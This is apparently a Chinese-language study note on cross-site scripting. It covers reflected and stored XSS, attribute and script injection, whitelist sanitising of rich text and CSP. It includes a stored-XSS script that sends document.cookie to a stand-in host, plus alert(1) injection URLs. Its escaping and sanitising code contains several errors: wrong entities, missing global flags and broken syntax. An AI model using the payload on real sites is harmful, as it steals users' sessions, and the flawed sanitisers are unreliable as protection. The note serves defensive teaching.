---
title: web安全之XSS
type: "categories"
categories: 其他
---

# xss (cross site script)
跨站脚本攻击，比如：
造成的危害：
	获取页面数据
	获取cookies
	获取用户密码
	劫持前端逻辑
	发送请求
	欺骗用户
	......

类型： 
	url  反射型攻击
	存储型 存储到DB后再读出（表单存储)
	比如：嵌入表单
```
<script type="text/javascript">
	let img = document.create('img')
	img.width  = 0
	img.height = 0
	img.src = "https://www.yyy.com/joke/jp.php?joke=' + encodeURIcomponent(document.cookie)'"
</script>
```

把这些存入数据库，用户再次访问的时候会读取这个脚本
1. HTML内容
http://localhost:8000/?from=<script>alert(1)</script>
escapeHTML() {
	str.replace(/</, '&lt')
	str.replace(/>/, '&rt')
}

2. HTML属性注入
逃出html属性的控制
localhost:8000?avatarId=1.png" onerror ="alert(1)

解决方案：
```
escapeHTMLAttribute() {
	str.replace(/"/g, '&quot')
	str.replace(/'/g, '&#39')
	str.replace(/' '/g, '&#32')
}
```
把前两者合并成一个
```
escapeHTML(str) {
	//这个要注意html解析的时候，多个空格会解析成一个空格，所以这里不予转义，主要不要html属性加上引号就可以了
	str.replace(/</g, '&lt')
	str.replace(/>/g, '&rt')
	str.replace(/"/g, '&quot')
	str.replace(/'/g, '&#39')
}
```
其实浏览器已经帮我们阻止掉了前面两种攻击

2. js注入
http://localhost:8000/?from=google";alert(1);" 一定要关闭分号;
```
<script>
	let data = "#{data}"
	let data = "hello;";alert(1)""
</script>
解决办法：
JSON.stringify(str)
```
3. 富文本
按照白名单保留标签和属性，引用一个cheerio
```
var cheerio = require('cheerio')
var $ = cheerio.load(html)
//白名单
var whiteList = {
	'img': ['src'],
	'font': ['color', 'size']
}
$('*').each((index, ele) => {
	if(!(whiteList[ele.name]) {
		$(ele).remove()
		return
	})
})
for(var attr in elem.attribute) {
	if(whiteList[ele.name].indexOf(attr) === -1) {
		$(ele).attr(attr, null)
	}
}
return $.html()

可以使用第三方库 js-xss
``

浏览器标准做了些什么CSP（内容安全策略）
指定哪些内容可以执行
首部字段设置：Content-Security-Policy default-src  self


